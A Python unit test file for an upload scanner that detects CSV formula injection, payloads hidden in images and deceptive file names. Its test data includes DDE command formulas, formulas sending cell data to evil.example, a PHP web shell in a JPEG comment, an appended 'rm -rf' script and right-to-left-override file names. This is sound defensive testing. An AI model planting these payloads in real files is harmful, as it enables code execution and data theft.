"""CSV formula injection, data hidden in images, and tricks in the uploaded file name."""

import io
import os
import struct
import unittest
import zlib
import zipfile

import helpers  # noqa: F401
import file_structure as F

PE = b"MZ" + b"\x90" * 62 + b"PE\x00\x00" + b"\x00" * 200


def chunk(ctype, data):
    return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", zlib.crc32(ctype + data) & 0xffffffff)


def make_png(extra=b""):
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00\xff\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"") + extra


def make_jpeg(extra=b"", comment=b""):
    body = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    if comment:
        body += b"\xff\xfe" + struct.pack(">H", len(comment) + 2) + comment
    return body + b"\x00" * 40 + b"\xff\xd9" + extra


def small_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("note.txt", "Cloudie test")
    return buf.getvalue()


def run(data, name):
    path = helpers.write_temp(data, suffix=os.path.splitext(name)[1] or ".bin")
    try:
        return F.analyze(path, name)
    finally:
        os.remove(path)


def ids(r, strong_only=False):
    return [f["id"] for f in r["findings"] if f["strong"] or not strong_only]


class Csv(unittest.TestCase):
    def test_dde_command_in_a_cell_is_strong(self):
        r = run(b"name,amount\nAnna,10\n=cmd|' /c calc'!A1,5\n", "report.csv")
        self.assertIn("csv_dde_formula", ids(r, True))

    def test_other_cell_starts_and_quoting_are_caught(self):
        for cell in (b'"=cmd|\'/c calc\'!A1"', b"+cmd|'/c calc'!A1", b"-cmd|'/c calc'!A1", b"@SUM(1)+cmd|'/c x'!A1",
                     b"=powershell|'-enc AAAA'!A1", b"= MSHTA |'http://x'!A1"):
            r = run(b"a,b\n1," + cell + b"\n", "x.csv")
            self.assertIn("csv_dde_formula", ids(r, True), cell)

    def test_data_leaking_formula_is_medium(self):
        r = run(b'a,b\n1,"=HYPERLINK(""http://evil.example/?d=""&A1,""click"")"\n', "x.csv")
        self.assertIn("csv_exfil_formula", ids(r))
        self.assertEqual(r["strong_ids"], [])
        r2 = run(b"a\n=WEBSERVICE(\"https://evil.example/?x=\"&A2)\n", "x.csv")
        self.assertIn("csv_exfil_formula", ids(r2))

    def test_normal_spreadsheet_content_is_clean(self):
        csv = (b"item,price,note\nbolt,-5,ok\nnut,+3.5,ok\nsum,=SUM(B2:B3),total\n"
               b"call,@home,text\nlinks,https://example.com,fine\n"
               b"'- curl | bash is how some installers work',x,y\n")
        r = run(csv, "data.csv")
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["file_type"], "text")

    def test_a_plain_hyperlink_formula_without_a_web_address_is_clean(self):
        self.assertEqual(run(b'a\n=HYPERLINK("#Sheet2!A1","go")\n', "x.csv")["findings"], [])

    def test_text_files_are_not_checked_for_spreadsheet_formulas(self):
        # a how-to written in a .txt may contain "= cmd | ..." lines; only .csv is opened as a spreadsheet
        r = run(b"=cmd|' /c calc'!A1\n", "howto.txt")
        self.assertEqual(r["findings"], [])


class Images(unittest.TestCase):
    def test_plain_images_are_clean(self):
        self.assertEqual(run(make_png(), "a.png")["findings"], [])
        self.assertEqual(run(make_jpeg(), "a.jpg")["findings"], [])
        self.assertEqual(run(make_png(b"\n"), "a.png")["findings"], [])               # a stray byte is ignored

    def test_a_zip_after_the_png_end_is_strong(self):
        r = run(make_png(small_zip()), "photo.png")
        self.assertIn("image_hidden_payload", ids(r, True))
        self.assertEqual(r["file_type"], "png")

    def test_a_program_after_the_jpeg_end_is_strong(self):
        r = run(make_jpeg(PE), "photo.jpg")
        self.assertIn("image_hidden_payload", ids(r, True))
        r2 = run(make_png(b"This program cannot be run in DOS mode" + b"\x00" * 40), "photo.png")
        self.assertIn("image_hidden_payload", ids(r2, True))

    def test_a_pdf_or_script_after_the_end_is_strong(self):
        # the PDF starts after 2 KB of padding, so the file as a whole is still a PNG
        self.assertIn("image_hidden_payload", ids(run(make_png(b"\x00" * 2000 + helpers.PDF_PLAIN), "a.png"), True))
        self.assertIn("image_hidden_payload", ids(run(make_jpeg(b"#!/bin/sh\nrm -rf x\n" + b"\x00" * 20), "a.jpg"), True))

    def test_unrecognised_extra_data_is_only_medium(self):
        r = run(make_png(b"\x01\x02\x03" * 40), "a.png")
        self.assertIn("image_trailing_data", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_php_code_hidden_in_a_jpeg_comment_is_strong(self):
        r = run(make_jpeg(comment=b"<?php system($_GET['c']); ?>"), "avatar.jpg")
        self.assertIn("image_script_payload", ids(r, True))

    def test_a_script_tag_inside_a_png_text_chunk_is_strong(self):
        data = make_png().replace(chunk(b"IEND", b""), chunk(b"tEXt", b"Comment\x00<script>alert(1)</script>") + chunk(b"IEND", b""))
        self.assertIn("image_script_payload", ids(run(data, "a.png"), True))

    def test_a_broken_png_chunk_list_is_reported_not_crashed(self):
        r = run(make_png()[:40], "a.png")
        self.assertIn("image_malformed", ids(r))
        self.assertEqual(r["strong_ids"], [])

    def test_a_png_that_is_really_a_program_is_caught_by_the_name_check(self):
        self.assertIn("type_mismatch_executable", ids(run(PE, "photo.png"), True))


class FileNames(unittest.TestCase):
    def names(self, name, data=b"hello\n"):
        return run(data, name)

    def test_double_extension_is_strong(self):
        for name in ("invoice.pdf.exe", "report.docx.scr", "photo.jpg.js", "scan.PDF.Exe"):
            self.assertIn("filename_double_extension", ids(self.names(name), True), name)

    def test_right_to_left_override_is_strong(self):
        self.assertIn("filename_rtlo", ids(self.names("invoice\u202egpj.exe"), True))
        self.assertIn("filename_rtlo", ids(self.names("cv\u202e.pdf"), True))

    def test_padding_spaces_before_the_real_extension_are_still_a_double_extension(self):
        self.assertIn("filename_double_extension", ids(self.names("invoice.pdf          .exe"), True))

    def test_a_program_extension_alone_is_medium(self):
        r = self.names("setup.exe")
        self.assertIn("filename_executable_extension", ids(r))
        self.assertEqual([i for i in ids(r, True) if i.startswith("filename_")], [])

    def test_trailing_dot_or_space_is_medium(self):
        self.assertIn("filename_trailing_chars", ids(self.names("notes.txt.")))
        self.assertIn("filename_trailing_chars", ids(self.names("notes.txt ")))

    def test_control_characters_are_medium(self):
        self.assertIn("filename_control_chars", ids(self.names("a\x01b.txt")))

    def test_ordinary_names_are_clean(self):
        for name in ("report.pdf", "my.report.v2.docx", "Quarterly Report 2026.pdf", "photo.jpeg", "data.final.csv",
                     "archive.tar.zip", "invoice.pdf.zip"):
            r = self.names(name, make_png() if name.endswith("jpeg") else b"hello\n")
            self.assertEqual([i for i in ids(r) if i.startswith("filename_")], [], name)

    def test_the_check_also_runs_for_pdfs_and_office_files(self):
        r = run(helpers.PDF_PLAIN, "invoice.pdf.exe")
        self.assertIn("filename_double_extension", ids(r, True))
        self.assertEqual(r["file_type"], "pdf")

    def test_paths_in_the_uploaded_name_are_ignored_but_the_base_name_is_checked(self):
        self.assertIn("filename_double_extension", ids(self.names("C:\\Users\\me\\invoice.pdf.exe"), True))
        self.assertEqual([i for i in ids(self.names("..\\..\\notes.txt")) if i.startswith("filename_")], [])


class Robustness(unittest.TestCase):
    def test_garbage_never_raises(self):
        for name in ("a.csv", "a.png", "a.jpg"):
            for data in (b"", b"\x00" * 10, os.urandom(2048), b"\x89PNG\r\n\x1a\n" + os.urandom(64), b"\xff\xd8\xff" + os.urandom(64)):
                r = run(data, name)
                self.assertIn("findings", r)

    def test_a_large_random_tail_is_not_mistaken_for_a_payload(self):
        # 2 MB of random bytes after a PNG: reported as extra data, never as a hidden program/archive by chance
        r = run(make_png(os.urandom(2 * 1024 * 1024)), "a.png")
        self.assertEqual(r["strong_ids"], [])


if __name__ == "__main__":
    unittest.main()
